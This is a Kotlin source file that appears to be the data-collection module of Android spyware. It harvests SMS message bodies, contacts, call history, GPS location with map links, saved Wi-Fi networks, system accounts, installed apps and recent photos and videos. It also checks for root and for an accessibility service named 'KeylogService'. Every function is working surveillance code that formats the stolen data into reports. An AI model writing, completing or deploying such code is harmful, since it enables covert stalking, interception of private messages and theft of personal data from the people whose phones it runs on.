package com.example.monitor

import android.annotation.SuppressLint
import android.accounts.AccountManager
import android.content.Context
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Coletores. Cada função devolve texto formatado ou vazio quando sem permissão.
 */
object Collector {

    private const val TAG = "Collector"

    private fun data(ms: Long): String =
        SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date(ms))

    fun aparelho(ctx: Context): String = buildString {
        append("<b>Aparelho</b>\n")
        append("Fabricante: ${Build.MANUFACTURER}\n")
        append("Modelo: ${Build.MODEL}\n")
        append("Dispositivo: ${Build.DEVICE}\n")
        append("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\n")
        append("Build: ${Build.ID}\n")
        append("Root: ${if (Root.disponivel()) "sim" else "não"}\n")
        append("Acessibilidade: ${acessibilidadeAtiva(ctx)}\n")
        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            append("Operadora: ${tm.networkOperatorName}\n")
            append("SIM: ${tm.simOperatorName}\n")
        } catch (e: Exception) {
            Log.w(TAG, "telefonia")
        }
        append("Fuso: ${java.util.TimeZone.getDefault().id}\n")
    }

    fun rede(ctx: Context): String = buildString {
        append("<b>Rede</b>\n")
        try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            append("Conectado: ${caps != null}\n")
            append("Wi-Fi: ${caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true}\n")
            append("Móvel: ${caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true}\n")
            append("VPN: ${caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true}\n")
        } catch (e: Exception) {
            append("Falha ao ler conectividade\n")
        }
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val ips = iface.inetAddresses
                while (ips.hasMoreElements()) {
                    val ip = ips.nextElement()
                    if (!ip.isLoopbackAddress) append("IP ${iface.name}: ${ip.hostAddress}\n")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "ips")
        }
    }

    @Suppress("DEPRECATION")
    fun wifi(ctx: Context): String = buildString {
        append("<b>Wi-Fi</b>\n")
        try {
            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val atual = wm.connectionInfo
            append("SSID atual: ${atual?.ssid}\n")
            append("BSSID: ${atual?.bssid}\n")
            append("MAC: ${atual?.macAddress}\n")
            append("RSSI: ${atual?.rssi} dBm\n")
            append("\n<b>Redes salvas</b>\n")
            for (rede in wm.configuredNetworks ?: emptyList()) {
                append("- ${rede.SSID} (${rede.BSSID})\n")
            }
        } catch (e: Exception) {
            append("Sem acesso ao Wi-Fi\n")
        }
    }

    @SuppressLint("MissingPermission")
    fun localizacao(ctx: Context): String = buildString {
        append("<b>Localização</b>\n")
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var achou = false
            for (provedor in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
                val loc = lm.getLastKnownLocation(provedor) ?: continue
                achou = true
                append("$provedor: ${loc.latitude}, ${loc.longitude}\n")
                append("Precisão: ${loc.accuracy} m\n")
                append("Horário: ${data(loc.time)}\n")
                append("Maps: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n\n")
            }
            if (!achou) append("Nenhuma posição em cache\n")
        } catch (e: SecurityException) {
            append("Sem permissão de localização\n")
        }
    }

    @SuppressLint("MissingPermission")
    fun sms(ctx: Context): String = buildString {
        append("<b>SMS</b>\n")
        try {
            ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                null, null, "date DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < Config.ROW_LIMIT) {
                    val tipo = if (c.getInt(3) == 1) "RECEBIDO" else "ENVIADO"
                    append("[${data(c.getLong(2))}] $tipo ${c.getString(0)}\n")
                    append(c.getString(1)?.take(400)).append("\n\n")
                    n++
                }
            }
        } catch (e: Exception) {
            append("Sem acesso aos SMS\n")
        }
    }

    fun contatos(ctx: Context): String = buildString {
        append("<b>Contatos</b>\n")
        try {
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < Config.ROW_LIMIT) {
                    append("${c.getString(0)}: ${c.getString(1)}\n")
                    n++
                }
            }
        } catch (e: Exception) {
            append("Sem acesso aos contatos\n")
        }
    }

    @SuppressLint("MissingPermission")
    fun chamadas(ctx: Context): String = buildString {
        append("<b>Chamadas</b>\n")
        try {
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < Config.ROW_LIMIT) {
                    val tipo = when (c.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "ENTRADA"
                        CallLog.Calls.OUTGOING_TYPE -> "SAÍDA"
                        CallLog.Calls.MISSED_TYPE -> "PERDIDA"
                        else -> "?"
                    }
                    append("[${data(c.getLong(2))}] $tipo ${c.getString(0)} (${c.getLong(3)}s)\n")
                    n++
                }
            }
        } catch (e: Exception) {
            append("Sem acesso ao histórico de chamadas\n")
        }
    }

    fun aplicativos(ctx: Context): String = buildString {
        append("<b>Aplicativos instalados</b>\n")
        val pm = ctx.packageManager
        val lista = try {
            pm.getInstalledPackages(0)
        } catch (e: Exception) {
            emptyList()
        }
        var n = 0
        for (pacote in lista.sortedBy { it.packageName }) {
            if (n >= 300) break
            val sistema = (pacote.applicationInfo?.flags ?: 0) and
                android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0
            if (sistema) continue
            val rotulo = try {
                pm.getApplicationLabel(pacote.applicationInfo!!).toString()
            } catch (e: Exception) {
                pacote.packageName
            }
            append("$rotulo (${pacote.packageName}) v${pacote.versionName}\n")
            n++
        }
    }

    fun contas(ctx: Context): String = buildString {
        append("<b>Contas do sistema</b>\n")
        try {
            for (conta in AccountManager.get(ctx).accounts) {
                append("${conta.type}: ${conta.name}\n")
            }
        } catch (e: Exception) {
            append("Sem acesso às contas\n")
        }
    }

    fun midiaRecente(ctx: Context): List<File> {
        val saida = mutableListOf<File>()
        val projecao = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DATE_ADDED)
        val colecoes = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        )
        for (uri in colecoes) {
            try {
                ctx.contentResolver.query(uri, projecao, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
                    ?.use { c ->
                        var n = 0
                        while (c.moveToNext() && n < Config.MEDIA_LIMIT) {
                            val caminho = c.getString(0) ?: continue
                            val arquivo = File(caminho)
                            if (arquivo.exists() && arquivo.length() in 1..Config.MEDIA_MAX_BYTES) {
                                saida.add(arquivo)
                                n++
                            }
                        }
                    }
            } catch (e: Exception) {
                Log.w(TAG, "mídia")
            }
        }
        return saida
    }

    fun acessibilidadeAtiva(ctx: Context): String {
        val servico = "${ctx.packageName}/${KeylogService::class.java.name}"
        val ativos = Settings.Secure.getString(
            ctx.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return "não"
        return if (ativos.contains(servico)) "sim" else "não"
    }

    fun ignorandoBateria(ctx: Context): Boolean {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(ctx.packageName)
    }
}
